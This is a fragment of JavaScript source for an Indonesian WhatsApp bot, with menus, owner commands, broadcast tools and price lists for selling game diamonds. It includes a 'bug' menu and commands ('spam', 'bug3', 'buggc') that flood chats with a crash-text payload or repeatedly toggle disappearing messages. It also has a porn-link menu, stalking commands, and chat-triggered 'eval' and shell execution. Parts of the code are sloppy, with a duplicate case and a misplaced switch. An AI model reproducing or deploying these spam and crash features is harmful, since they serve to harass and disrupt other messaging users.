case 'bokepmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑩𝑶𝑲𝑬𝑷 𝑴𝑬𝑵𝑼
 
🌚${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
🌚${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ1
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ2
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ4
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ5
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ6
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ7
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ8
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ9
🌚${prefix}ʀᴀɴᴅᴏᴍʙᴏᴋᴇᴘ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//SOUND MENU
case 'soundmenu':
menu = `
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑺𝑶𝑼𝑵𝑫 𝑴𝑬𝑵𝑼
 
🎶${prefix}sᴏᴜɴᴅ
🎶${prefix}sᴏᴜɴᴅ1
🎶${prefix}sᴏᴜɴᴅ2
🎶${prefix}sᴏᴜɴᴅ3
🎶${prefix}sᴏᴜɴᴅ4
🎶${prefix}sᴏᴜɴᴅ5
🎶${prefix}sᴏᴜɴᴅ6
🎶${prefix}sᴏᴜɴᴅ7
🎶${prefix}sᴏᴜɴᴅ8
🎶${prefix}sᴏᴜɴᴅ9
🎶${prefix}sᴏᴜɴᴅ10
🎶${prefix}sᴏᴜɴᴅ11
🎶${prefix}sᴏᴜɴᴅ12
🎶${prefix}sᴏᴜɴᴅ13
🎶${prefix}sᴏᴜɴᴅ14
🎶${prefix}sᴏᴜɴᴅ15
🎶${prefix}sᴏᴜɴᴅ16
🎶${prefix}sᴏᴜɴᴅ17
🎶${prefix}sᴏᴜɴᴅ18
🎶${prefix}sᴏᴜɴᴅ19
🎶${prefix}sᴏᴜɴᴅ20

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//OTHER MENU
case 'othermenu':
menu = `
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑶𝑻𝑯𝑬𝑹 𝑴𝑬𝑵𝑼
 
🏮${prefix}ʙʀᴀɪɴʟʏ
🏮${prefix}sʜᴏᴘᴇᴇ
🏮${prefix}ᴘʟᴀʏsᴛᴏʀᴇ
🏮${prefix}ssᴡᴇʙ
🏮${prefix}ɪᴍᴀɢᴇ
🏮${prefix}ɢᴏᴏɢʟᴇ
🏮${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
🏮${prefix}ɴᴜʟɪs
🏮${prefix}ɪɢᴜsᴇʀ
🏮${prefix}ɪɢsᴛᴀʟᴋ
🏮${prefix}ɢɪᴛʜᴜʙsᴛᴀʟᴋ
🏮${prefix}ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
🏮${prefix}ɪᴍɢ2ᴜʀʟ
🏮${prefix}ʏᴛsᴇᴀʀᴄʜ
🏮️${prefix}ʀᴇᴀᴅᴍᴏʀᴇ <ᴛᴇxᴛ𝟷|ᴛᴇxᴛ𝟸>

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//OWNER MENU 
case 'ownermenu':
menu = `
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 𝑶𝑾𝑵𝑬𝑹 𝑴𝑬𝑵𝑼
 
☃️> ᴇᴠᴀʟ
☃️$ ᴇxᴇᴄᴏᴛ
☃️+<>+ <ᴋᴜᴅᴇᴛ>
☃️${prefix}sᴇʟғ
☃️${prefix}ᴘᴜʙʟɪᴄ
☃️${prefix}ʀᴇsᴛᴀʀᴛ
☃️${prefix}ᴀɴᴛɪᴛᴀɢ <ᴏɴ/ᴏғ>
☃️${prefix}ᴏɴ
☃️${prefix}ᴏғғ
☃️${prefix}ʀᴇsᴇᴛʟɪᴍɪᴛ
☃️${prefix}sᴇᴛᴘᴘ
☃️${prefix}sᴇᴛɴᴀᴍᴇ
☃️${prefix}sᴇᴛʙɪᴏ
☃️${prefix}sᴇᴛᴘʀᴇғɪx
☃️${prefix}ʙᴄ
☃️${prefix}ʙʟᴏᴄᴋ
☃️${prefix}ᴜɴʙʟᴏᴄᴋ
☃️${prefix}ʙᴀɴ
☃️${prefix}ᴜɴʙᴀɴ
☃️${prefix}ᴄʟᴇᴀʀᴀʟʟ
☃️${prefix}sᴇᴛᴄᴍᴅ
☃️${prefix}ᴅᴇʟᴄᴍᴅ
☃️${prefix}ᴇxɪғ <ɴᴀᴍᴀ|ᴀᴜᴛʜᴏʀ>
☃️${prefix}ᴀᴅᴅsᴇᴡᴀ <ʟɪɴᴋ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟsᴇᴡᴀ <ɪᴅ ɢʀᴜᴘ>
☃️${prefix}ᴀᴅᴅᴘʀᴇᴍ <ᴛᴀɢ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟᴘʀᴇᴍ <ᴛᴀɢ>
 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

     case 'command':
     case 'menusimpel':
               list = []
               listmenu = [`newfitur`,`photooxy`,`textprome`,`ephotokon`,`groupmenu`,`soundmenu`,`bokepmenu`,`wibumenu`,`stickermenu`,`ownermenu`,`gamemenu`,`funmenu`,`bugmenu`,`downloadmenu`,`infomenu`,`othermenu`,`owner`]
               listmenuu = [`New Fitur`,`Photo Oxy`,`Textprome`,`Ephoto 360`,`Group Menu`,`Sound Menu`,`Bokep Menu`,`Wibu Menu`,`Sticker Menu`,`Owner Menu`,`Game Menu`,`Fun Menu`,`Bug Menu`,`Download Menu`,`Info Menu`,`Other Menu`,`Owner`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: '--------------------------------------------------------------',
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`, `𝙃𝙖𝙞 𝙆𝙖𝙠 ${pushname}, 𝙋𝙞𝙡𝙞𝙝 𝙈𝙚𝙣𝙪 𝘿𝙞𝙨𝙞𝙣𝙞\n\n𝑆𝑝𝑎𝑚 = 𝐵𝑙𝑜𝑐𝑘\n𝑇𝑒𝑙𝑝𝑜𝑛/𝑉𝑐 = 𝐵𝑙𝑜𝑐𝑘`, list)
               break
       case 'debug':
			 res = await Hisnu.prepareMessageFromContent(from,{
                      "templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${time} - ${tanggal}`,
							"hydratedFooterText": `㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
Hisnu.relayWAMessage(res)
break
const isBtMsg = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''               
const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''               
// Cmd Button Msg
switch (isBtMsg) {
case 'public':
reply('Bacot')
break
}
// Cmd List Msg
switch (isStMsg) {
  case 'public':
          if (!mek.key.fromMe && !isOwner) return
          if (banChats === false) return
          uptime = process.uptime()
          banChats = false
          ftroli(`𝘿𝘼𝙃 𝙋𝙐𝘽𝙇𝙄𝘾`)
          break
  case 'self':
           if (!mek.key.fromMe && !isOwner) return
           if (banChats === true) return
           uptime = process.uptime()
           banChats = true
           ftroli(`𝙎𝙀𝙇𝙁 𝙇𝙊𝙍𝘿`)
           break
   case 'deletepc':
           if (!mek.key.fromMe && !isOwner) return
           anu = await Hisnu.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
           for (let _ of anu) {
           Hisnu.modifyChat(_.jid, 'delete', {
           includeStarred: false
           })
           }
           await reply(`Berhasil menghapus ${anu.length} pribadi chat`)
           break
   case 'restart':
           if (!mek.key.fromMe && !isOwner) return
           const cmdse = 'node main.js'
           fakestatus('Restart...')
           await exec(cmdse, (err, stdout) => {
           if (err) return Hisnu.sendMessage(from, `${err}`, text, { quoted: mek })
           if (stdout) {
           fakestatus('Restart...')
           }
           })
           console.log(stdout)
           break
           }		  
//------------------< Owner >-------------------
case 'setimglink':
            if (!mek.key.fromMe && !isOwner) return 
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Hisnu.downloadMediaMessage(boij)
			fs.writeFileSync(`./media/wpmobile.png`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}setimglink`)
          	}
			break	
case 'setfakeimg':
            if (!mek.key.fromMe && !isOwner) return 
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Hisnu.downloadMediaMessage(boij)
			fs.writeFileSync(`./media/Nakano.jpg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}setfakeimg`)
          	}
			break
case 'setthumb':
            if (!mek.key.fromMe && !isOwner) return 
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await Hisnu.downloadMediaMessage(boij)
			fs.writeFileSync(`./media/Menu.jpg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}setthumb`)
          	}
			break	
case 'antitag':
           if (!mek.key.fromMe && !isOwner) return
           if (args.length < 1) return reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
           if (args[0] === 'on') {
           if (antitags === true) return
           antitags = true
           freply(`Berhasil mengaktifkan antitag!`)
           } else if (args[0] === 'off') {
           if (antitags === false) return
           antitags = false
           freply(`Berhasil menonaktifkan antitag!`)
           } else {
           reply('Pilih on atau off')
           }
           break

		case 'unbann':
			if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			bnnd = body.slice(7)
			ban.splice(`${bnnd}s.whatsapp.net`, 1)
			fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
		    reply(`Nomor wa.me/${bnnd} telah di unban!`)
		    break
       case 'ban':
    	    if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			bnnd = body.slice(5)
			ban.push(`${bnnd}s.whatsapp.net`)
			fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
			reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
			break
      case 'addupdate':
             if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
             if (!q) return reply(`Example: ${command} update fitur`)
           _update.push(q)
             fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
             reply(`Update fitur berhasil ditambahkan ke database!`)
             break
      case 'update':
             let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
             for (let i of _update) {
             updateList += `࿃ *${i.replace(_update)}*\n\n`
}
             textImg(updateList)
             break
      case 'reset':
             if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
             var reset = []
             glimit = reset
           _update = reset
             console.log('Hang tight, it\'s time to reset')
             fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
             fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
             textImg('Oke Desu ~')
             break
      case 'exif':
             if (!mek.key.fromMe && !isOwner) return 
             if (!q) return reply(mess.wrongFormat)
             if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
             exif.create(arg.split('|')[0], arg.split('|')[1])
             reply('sukses')
             break
      case 'join': 
             if (!q) return reply('Linknya?')
             if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = Hisnu.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('Berhasil Masuk Grup')
             break
      case 'eval':
             try {
             if (!isOwner) return
             sy = args.join(' ')
             return eval(sy)
             } catch(e) {
             reply(`${e}`)
}
             break
      case 'getquoted':
             reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
             break         
      case 'bc':
             if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu100 = await Hisnu.chats.all()
             if (isMedia && !Hisnu.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Hisnu).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Hisnu
             bc100 = await Hisnu.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             Hisnu.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             Hisnu.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧',
			"buttons": [
			{"buttonId": `#oke`,
			"buttonText": {"displayText": "Oke Bang 😎"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
      case 'bn':
             if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
            anu100 = await Hisnu.chats.all()
            if (isMedia && !Hisnu.message.videoMessage || isQuotedImage) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dha).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Hisnu
            bc100 = await Hisnu.downloadMediaMessage(encmedia)
            for (let _ of anu100) {
            Hisnu.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
            fakestatus('Suksess broadcast')
            } else {
            for (let _ of anu100) {
            Hisnu.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧',
			"buttons": [
			{"buttonId": `#allmenu`,
			"buttonText": {"displayText": "LIST MENU"
			},"type": "RESPONSE"},
			{"buttonId": `#owner`,
			"buttonText": {"displayText": "OWNER"
			},"type": "RESPONSE"},
			{"buttonId": `#rules`,
			"buttonText": {"displayText": "RULES"
			},"type": "RESPONSE"},
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
            fakestatus('Suksess broadcast')
}
            break
      case 'bcgc':
	        if (!isOwner && !mek.key.fromMe) return 
			if (args.length < 1) return reply('.......')
		    anu = await groupMembers 
			tagss = mek.participant
			if (isMedia && !mek.message.videoMessage || isQuotedImage) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			buffer = await Hisnu.downloadMediaMessage(encmedia)
			for (let _ of anu) {
			Hisnu.sendMessage(_.jid, buffer, image, {caption: `*「 BC GROUP 」*\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
						}
						reply('')
					} else {
				for (let _ of anu) {
						sendMess(_.jid, `𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 𝙂𝙍𝙐𝙋\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
				}
				reply('Sukses broadcast group')
		    	}
				break                   
     case 'tobc':
				if (!mek.key.fromMe && !isOwner) return
				Hisnu.updatePresence(from, Presence.composing)
					anu = await Hisnu.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hisnu.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hisnu.sendMessage(_.jid, buff, audio, { quoted: ftroli })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hisnu.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hisnu.sendMessage(_.jid, buff, sticker, { quoted: cel, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
      case 'clearall':
             if (!isOwner) return  reply(mess.only.owner)
             anu = await Hisnu.chats.all()
             Hisnu.setMaxListeners(25)
             for (let _ of anu) {
             Hisnu.deleteChat(_.jid)
}
             reply('Sukses delete all chat :)')
             break
      case 'term':
             if (!isOwner) return
             if (!q) return
             exec(q, (err, stdout) => {
             if (err) return reply(`${err}`)
             if (stdout) {
             reply(stdout)
}
})
             break 
      case 'shutdown':
             if (!isOwner) return 
             reply(`Bye...`)
             await sleep(3000)
             process.exit()
             break
     case 'restart':
             if (!mek.key.fromMe && !isOwner) return
             reply('Restart...')
             await exec(`node main.js`, (err, stdout) => {
             if (err) return Hisnu.sendMessage(from, `${err}`, text, { quoted: mek })
             if (stdout) {
             console.log('Berhasil Restart..')
             }
             })
             console.log(stdout)
             break       
      case 'leave':
              if (!isGroup) return reply(mess.only.group)
              setTimeout( () => {
              Hisnu.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              reply('𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 𝑩𝒆𝒏𝒕𝒂𝒓 𝑳𝒂𝒈𝒊 𝑶𝒖𝒕 𝑫𝒂𝒉 𝑫𝒂𝒉 𝑵𝒈𝒂𝒃 ...')
              }, 0)
              break
      case 'leaveall':
             if (!isOwner) return  reply(mess.only.owner)
             let totalgroup = Hisnu.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
             for (let id of totalgroup) {
             sendMess(id, 'Byee', null)
             await sleep(3000)
             Hisnu.groupLeave(id)
}
             break
//DM ATAU JUALAN DISINI///
   case 'setfake':
            if (!mek.key.fromMe && !isOwner) return	
			if (!q) return fakegstatus(mess.wrongFormat)
			fake = q
			fakestatus(`Succes Mengganti Conversation Fake : ${q}`)
			break
 case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await Hisnu.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             Hisnu.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
   case 'buggc': 
            reply('Bwhahahwahaha')
            await ikyy.toggleDisappearingMessages(from)
            Hisnu.sendMessage(from, `Aqokqowkej`)
             break
   case 'spam':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Hisnu.sendMessage(from, `${virtex2}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 1234,
status: 1,
surface: 10,
orderTitle: `Hisnu`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break

case 'bug3':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
await Hisnu.toggleDisappearingMessages(from, 0)
}
break
   case 'getbio':
var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await Hisnu.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found")
}
break
   case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
   case 'order':
               list = []
               listmenu = [`ffdm`,`dml`,`jasher`,`logojb`,`sewabotz`]
               listmenuu = [`DIAMOND FREE FIRE`,`DIAMOND ML`,`JASA SHER`,`LOGO JB`,`SEWA BOT`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: '️LIST =️' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`, `𝐇𝐚𝐢𝐢 𝐤𝐚𝐤 𝐦𝐚𝐮 𝐛𝐞𝐥𝐢 𝐤𝐞𝐛𝐮𝐭𝐮𝐡𝐚𝐧 𝐠𝐚𝐦𝐞?\n𝐃𝐢𝐬𝐢𝐧𝐢 𝐭𝐞𝐫𝐬𝐞𝐝𝐢𝐚 🙏`, list)
               break
case 'bugmenu':
menu =`
*${ucapanWaktu}👋*
*𝐖𝐢𝐛 : ${time}*
*𝐖𝐢𝐭𝐚 : ${timeMak}*
*𝐖𝐢𝐛 : ${timeJay}*

 *𝑩𝑼𝑮 𝑴𝑬𝑵𝑼🌹*
 
🔖${prefix}ʙᴜɢ1
🔖${prefix}ʙᴜɢ2
🔖${prefix}ʙᴜɢ3 <ᴊᴜᴍʟᴀʜ>
🔖${prefix}bugpc
🔖${prefix}ʙᴜɢᴘᴄ2 <ᴊᴜᴍʟᴀʜ>
🔖${prefix}ʙᴜɢᴛʀᴏʟɪ
🔖${prefix}ʙᴜɢᴛʀᴏʟɪ2 <ᴊᴜᴍʟᴀʜ>
🔖${prefix}ʙᴜɢʜᴏʟᴇ
🔖${prefix}ʙᴜɢᴠɴ
🔖${prefix}ʙᴜɢʟᴏᴋᴀsɪ
🔖${prefix}ʙᴜɢᴄᴏᴍʙɪɴᴇ
🔖${prefix}ʙᴜɢᴋᴀᴛᴀʟᴏɢ

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘
  ͭ ͤ ⷶ ͫ  ͥ ᷠ ᷤ ᷮ ͥ ͬ`
katalog(menu)
break

//FUN MENU
case 'ffdm':
case 'dmff':
case 'dmfreefire':
case 'freefiredm':
case 'Diamond ff':
case 'diamond ff':
menu =`
𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 𝐃𝐈𝐀𝐌𝐎𝐍𝐃
       𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄

𝟭𝟬𝟬%  𝘼𝙈𝘼𝙉 𝘿𝘼𝙉 𝙏𝙀𝙍𝙋𝙀𝙍𝘾𝘼𝙔𝘼 𝙊𝙉𝙇𝙔 𝙄𝘿 + 𝙉𝙄𝘾𝙆𝙉𝘼𝙈𝙀

𝟳𝟬 💎 = 𝟭𝟬.𝟬𝟬𝟬
𝟭𝟰𝟬 💎 = 𝟮𝟬.𝟬𝟬𝟬
𝟮𝟭𝟬 💎 = 𝟯𝟬.𝟬𝟬𝟬
𝟯𝟱𝟱 💎 = 𝟱𝟬.𝟬𝟬𝟬
𝟰𝟮𝟱 💎 = 𝟱𝟴.𝟬𝟬𝟬
𝟱𝟬𝟬 💎 = 𝟳𝟬.𝟬𝟬𝟬
𝟳𝟮𝟬 💎 = 𝟵𝟵.𝟬𝟬𝟬
𝟴𝟲𝟬 💎 = 𝟭𝟮𝟬.𝟬𝟬𝟬
𝟭.𝟬𝟬𝟬 💎 = 𝟭𝟰𝟬.𝟬𝟬
𝟭.𝟰𝟰𝟬 💎 = 𝟮𝟬𝟬.𝟬𝟬𝟬
𝟮.𝟬𝟬𝟬 💎 = 𝟮𝟳𝟬.𝟬𝟬𝟬
𝟯.𝟬𝟲𝟬 💎 = 𝟱𝟬𝟬.𝟬𝟬𝟬
*MEMBERSIP MINGUAN* = 𝟯𝟬.𝟬𝟬𝟬
*MEMBERSIP BULANAN* = 𝟭𝟭𝟵.𝟬𝟬𝟬

𝑰𝒏𝒈𝒊𝒏 𝑻𝒂𝒏𝒚𝒂 𝑯𝒂𝒓𝒈𝒂 𝑫𝒎 𝑳𝒂𝒊𝒏𝒏𝒚𝒂 ? 𝑪𝒉𝒂𝒕 𝑶𝒘𝒏𝒆𝒓 𝑮𝒘

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
katalog(menu)
break
case 'dml':
case 'dmml':
case 'mldm':
menu =` 
𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 𝐃𝐈𝐀𝐌𝐎𝐍𝐃
   𝐌𝐎𝐁𝐈𝐋𝐄 𝐋𝐄𝐆𝐄𝐍𝐃

𝟭𝟬𝟬% 𝘼𝙈𝘼𝙉 𝙃𝘼𝙉𝙔𝘼 𝘽𝙐𝙏𝙐𝙃 𝙑𝙄𝘼 𝙄𝘿

𝟱    💎   = 𝟭.𝟲𝟬𝟬
𝟭𝟭   💎   = 𝟯.𝟳𝟬𝟬
𝟭𝟳   💎   = 𝟱.𝟴𝟬𝟬
𝟮𝟱   💎   = 𝟴.𝟳𝟬𝟬
𝟰𝟬   💎   = 𝟭𝟮.𝟲𝟬𝟬
𝟱𝟯   💎   = 𝟭𝟲.𝟴𝟬𝟬
𝟳𝟳   💎   = 𝟮𝟰.𝟭𝟬𝟬
𝟭𝟱𝟰  💎   = 𝟰𝟴.𝟬𝟱𝟬
𝟮𝟭𝟳  💎   = 𝟳𝟭.𝟲𝟬𝟬
𝟮𝟱𝟲  💎   = 𝟴𝟴.𝟬𝟭𝟬
𝟯𝟲𝟳  💎   = 𝟭𝟮𝟮.𝟬𝟬𝟬
𝟱𝟬𝟯  💎   = 𝟭𝟲𝟲.𝟬𝟬𝟬
𝟳𝟳𝟰  💎   = 𝟮𝟱𝟮.𝟬𝟬𝟬
𝟭𝟳𝟬𝟴 💎   = 𝟱𝟱𝟭.𝟬𝟬𝟬
𝟰𝟬𝟬𝟯 💎   = 𝟭.𝟯𝟮𝟮.𝟬𝟬𝟬

